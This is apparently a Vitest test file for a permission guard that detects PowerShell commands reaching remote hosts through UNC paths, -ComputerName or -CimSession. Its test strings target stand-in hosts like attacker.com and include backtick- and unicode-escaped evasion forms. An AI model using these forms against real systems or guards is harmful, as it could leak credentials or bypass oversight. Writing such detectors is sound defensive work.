import { describe, expect, it } from "vitest";

import { hasRemoteAuthVector } from "./remote-auth-permission-guard";

describe("hasRemoteAuthVector — UNC paths (powershell)", () => {
  it.each([
    ["backslash UNC", "Get-Content \\\\attacker.com\\share\\file"],
    ["loopback UNC (no carve-out)", "Get-Content \\\\localhost\\share\\f"],
    ["long-path UNC", "Get-Content \\\\?\\UNC\\attacker.com\\share\\f"],
    ["forward-slash UNC", "Get-Content //attacker.com/share/file"],
    ["quoted UNC", 'Get-Content "\\\\attacker.com\\share\\f"'],
    ["UNC as Select-String -Path value", "Select-String -Path \\\\evil\\s\\f -Pattern x"],
    ["UNC after = sign (param=value form)", "Get-Content -Path=\\\\attacker.com\\share\\f"],
    ["UNC after : (PowerShell -Param:value form)", "Get-Content -Path:\\\\attacker.com\\share\\f"],
    [
      "UNC in comma-separated -Path list",
      "Get-Content -Path C:\\ok.txt,\\\\attacker.com\\share\\f",
    ],
    ["backtick-encoded backslash UNC", "Get-Content `\\`\\attacker.com`\\share`\\f"],
    ["partial backtick-encoded UNC", "Get-Content \\`\\attacker.com`\\share`\\f"],
    ["bare \\\\hostname (no share)", "Get-Content \\\\attacker.com"],
    ["bare \\\\hostname after = boundary", "Get-Content -Path=\\\\attacker.com"],
    ["bare \\\\hostname quoted", 'Get-Content "\\\\attacker.com"'],
    ["unicode-escaped backslash UNC", 'Get-Content "`u{5c}`u{5c}attacker\\share\\file.txt"'],
    ["unicode-escaped forward-slash UNC", "Get-Content `u{2f}`u{2f}attacker/share/file.txt"],
    [
      "unicode-escaped mixed with literal backslash",
      "Get-Content `u{5c}\\attacker\\share\\file.txt",
    ],
  ])("detects %s as remote", (_label, cmd) => {
    expect(hasRemoteAuthVector(cmd, "powershell")).toBe(true);
  });

  it.each([
    ["local absolute path", "Get-Content C:\\temp\\foo.log"],
    ["relative path", "Get-Content ./relative/path"],
    ["forward-slash relative path", "Get-Content foo/bar.txt"],
    ["empty", ""],
    ["bare cmdlet, no args", "Get-Content"],
  ])("does NOT flag %s", (_label, cmd) => {
    expect(hasRemoteAuthVector(cmd, "powershell")).toBe(false);
  });

  it("returns false in bash mode regardless of UNC-looking input", () => {
    // UNCs are a Windows / SMB concept; on POSIX shells the same lexeme is
    // just a path with leading slashes and has no credential side effect.
    expect(hasRemoteAuthVector("Get-Content \\\\attacker\\share", "bash")).toBe(false);
  });
});

describe("hasRemoteAuthVector — -ComputerName (powershell)", () => {
  it.each([
    ["full name", "Get-CimInstance -ComputerName attacker.com Win32_OperatingSystem"],
    ["short prefix -Com", "Get-CimInstance -Com attacker.com Win32_OS"],
    ["prefix -Computer", "Get-CimInstance -Computer attacker.com Win32_OS"],
    ["quoted value", 'Get-CimInstance -ComputerName "attacker.com" Win32_OS'],
    ["case-insensitive flag", "Get-CimInstance -computername attacker.com Win32_OS"],
    ["uppercase host", "Get-CimInstance -ComputerName ATTACKER.COM Win32_OS"],
    ["missing value (last token)", "Get-CimInstance -ComputerName"],
    ["value is another flag", "Get-CimInstance -ComputerName -Verbose"],
    ["Get-WmiObject -ComputerName remote", "Get-WmiObject -ComputerName attacker.com Win32_OS"],
    ["colon form remote", "Get-CimInstance -ComputerName:attacker.com Win32_OS"],
    ["colon form remote with prefix flag", "Get-CimInstance -Comp:attacker.com Win32_OS"],
    [
      "colon form empty value (treat as missing → remote)",
      "Get-CimInstance -ComputerName: Win32_OS",
    ],
    ["alias -CN remote", "Get-CimInstance -CN attacker.com Win32_OperatingSystem"],
    ["alias -cn (lowercase) remote", "Get-EventLog -cn attacker.com -LogName System"],
    ["alias -ServerName remote", "Get-CimInstance -ServerName attacker.com Win32_OS"],
    ["alias -Server prefix remote", "Get-CimInstance -Server attacker.com Win32_OS"],
    ["alias -CN:value colon form remote", "Get-CimInstance -CN:attacker.com Win32_OS"],
    ["alias -ServerName quoted remote", 'Get-CimInstance -ServerName "attacker.com" Win32_OS'],
    ["backtick-encoded -ComputerName", "Get-CimInstance -C`o`mputerName attacker.com Win32_OS"],
    ["backtick-encoded -CN alias", "Get-CimInstance -C`N attacker.com Win32_OS"],
    [
      "unicode-escaped -ComputerName (U+0075=u)",
      "Get-CimInstance -Comp`u{75}terName attacker.com Win32_OS",
    ],
  ])("detects %s as remote", (_label, cmd) => {
    expect(hasRemoteAuthVector(cmd, "powershell")).toBe(true);
  });

  it.each([
    ["localhost", "Get-CimInstance -ComputerName localhost Win32_OS"],
    ["127.0.0.1", "Get-CimInstance -ComputerName 127.0.0.1 Win32_OS"],
    ["::1", "Get-CimInstance -ComputerName ::1 Win32_OS"],
    ["bracketed IPv6 loopback [::1]", "Get-CimInstance -ComputerName [::1] Win32_OS"],
    ["dot shorthand", "Get-CimInstance -ComputerName . Win32_OS"],
    ["env:COMPUTERNAME literal", "Get-CimInstance -ComputerName $env:COMPUTERNAME Win32_OS"],
    ["no -ComputerName at all", "Get-CimInstance Win32_OS"],
    ["-Confirm is not -ComputerName", "Get-CimInstance -Confirm Win32_OS"],
    ["floor: -co is too short", "Get-CimInstance -co localhost Win32_OS"],
    ["colon form localhost", "Get-CimInstance -ComputerName:localhost Win32_OS"],
    ["colon form 127.0.0.1", "Get-CimInstance -ComputerName:127.0.0.1 Win32_OS"],
    ["alias -CN localhost", "Get-CimInstance -CN localhost Win32_OS"],
    ["alias -ServerName 127.0.0.1", "Get-CimInstance -ServerName 127.0.0.1 Win32_OS"],
    ["floor: -c is too short", "Get-CimInstance -c Win32_OS"],
  ])("does NOT flag %s", (_label, cmd) => {
    expect(hasRemoteAuthVector(cmd, "powershell")).toBe(false);
  });
});

describe("hasRemoteAuthVector — -CimSession (powershell)", () => {
  it.each([
    ["full name", "Get-CimInstance -CimSession $s Win32_OperatingSystem"],
    ["short prefix -Cim", "Get-CimInstance -Cim $s Win32_OS"],
    ["case-insensitive", "Get-CimInstance -cimsession $s Win32_OS"],
    ["with leading var assignment", "$result = Get-CimInstance -CimSession $s Win32_OS"],
    ["colon form", "Get-CimInstance -CimSession:$s Win32_OS"],
    ["backtick-encoded -CimSession", "Get-CimInstance -C`i`mSession $s Win32_OS"],
    ["unicode-escaped -CimSession (U+0069=i)", "Get-CimInstance -C`u{69}mSession $s Win32_OS"],
  ])("detects %s as remote", (_label, cmd) => {
    expect(hasRemoteAuthVector(cmd, "powershell")).toBe(true);
  });

  it.each([
    ["no -CimSession", "Get-CimInstance Win32_OS"],
    ["positional class name containing 'Cim' substring", "Get-CimInstance Win32_Cim_NotAFlag"],
    ["floor: -ci is too short", "Get-CimInstance -ci $s Win32_OS"],
  ])("does NOT flag %s", (_label, cmd) => {
    expect(hasRemoteAuthVector(cmd, "powershell")).toBe(false);
  });

  it("returns false in bash mode for -CimSession", () => {
    expect(hasRemoteAuthVector("Get-CimInstance -CimSession $s Win32_OS", "bash")).toBe(false);
  });
});
